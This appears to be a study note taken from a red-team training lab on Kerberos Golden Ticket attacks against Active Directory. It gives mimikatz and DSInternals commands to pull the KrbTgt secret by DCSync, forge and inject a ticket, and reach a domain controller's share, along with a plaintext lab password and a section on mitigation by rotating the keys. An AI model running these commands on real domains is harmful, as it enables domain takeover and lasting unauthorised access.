
The attackers know the secret of the KrbtTgt account 
	• Obtained with a DCSync attack 
	• Or a stolen backup 
They can craft their own tickets 
	• Impersonate any user 
	• For as long as the KrbTgt secret is valid 
	• Spoof group membership in the Privilege Attribute Certificate


#### Extract KrbTgt with DSInternals

```powershell
Get-ADReplAccount -user KrbTgt -domain contoso –server dc01
```


#### Extract KrbTgt with mimikatz

```powershell
lsadump::dcsync /domain:contoso.com /user:administrator
```


#### Forge the ticket

```powershell
kerberos::golden /domain:contoso.com /sid: /rc4: /user:administrator /id:500
```


#### On another system

```powershell
kerberos::ptt C:\ticket.kirbi
```


Golden Ticket Attack mitigation

The KrbTgt secret doesn’t change automatically ▪ It might be the same secret used for the last 10 years ▪ Assumed breach! It's possible you may have been compromised 10 years ago, but didn’t have the means to detect it ▪ Rotate the KrbTgt keys is a good idea ▪ It will help you detect Golden Tickets - if they get used with the wrong key, they will generate a specific event on the DCs ▪ Rotate the key twice ▪ As the previous key is still valid ▪ But not twice in a row as it will invalidate all issued TGT and impact users and applications ▪ Unless you are in security incident and want that ▪ Use the script New-KrbtgtKeys.ps1 to rotate the keys

Rotate KrbTgt keys

.\New-KrbtgtKeys.ps1



(ING) LAB 5 - Domination and persistence

3 Hr 7 Min Remaining

Instructions Resources Help  100%

## Exercise 4 - Perform Golden ticket attacks

Hello **Miss Red**. In this exercise you are going to mess with **Mister Blue** by crafting a TGT for the user and inject it into your own session. For this you are going to use the domain admin credentials of Katrina that you've previously stolen.

1. Log on to **[SRV01](https://labclient.labondemand.com/Instructions/6e093b8a-2f3b-4901-9748-814f5963167c?rc=10#)**. Use the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\katrina.mendoza.adm`|
    |Password|`NeverTrustAny1!`|
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127864/2022menu.png) and click on **Windows PowerShell (Admin)**.
    
3. In the **Administrator: Windows PowerShell** window run `cmd.exe` and then `title Admin console`. You should see the following: ![cmdtitle.png](https://labondemand.blob.core.windows.net/content/lab127864/cmdtitle.png)
    
4. In this renamed console, run the following `cd \Tools\mimikatz\mimikatz` (yes that's twice mimikatz, just because) and then `mimikatz.exe`.
    
5. Run the following to extract the KrbTgt secrets `lsadump::dcsync /user:krbtgt` and explorer the output.
    ![[Pasted image 20231015173257.png]]
6. Now run the following to craft your TGT for **Mister Blue** : `kerberos::golden /user:blue /domain:contoso.com /sid:S-1-5-21-1335734252-711511382-1358492552 /endin:5241600 /aes256:5d8029df60602bf0820ed46831e6ca4eb2a9767ed9fb4f35a741e1ec8bdb2605 /ptt`
    
    - **/sid** is the domain sid
    - **/endin** the the validity time for the TGT (normally it is 600 minutes)
    - **/aes256** is the AES256 hash of the KrbTgt account
    - **/ptt** is the Pass The Ticket parameter which means you will inject the crafted ticket in memory, without having to run another command

![[Pasted image 20231015173320.png]]

1. You can exit **mimikatz** by running `exit` and then run `klist`. Epxlore the output of the **klist** command.
    ![[Pasted image 20231015173338.png]]
   
    
    Let's put it to the test and access a resource.
    
8. You are still in the **Administrator: Admin console**, run the following `dir \\DC01.contoso.com\C$` and then run `klist`.
    
    You should see a new ticket for the **cifs/DC01.contoso.com**. The DC thinks this ticket has been requested by Blue, but in your case, it was requested using your crafted TGT ticket.
    
    And this will work even if blue changes his password. For as long as your TGT is valid for and as long as the KrbTgt key is still the same.
    

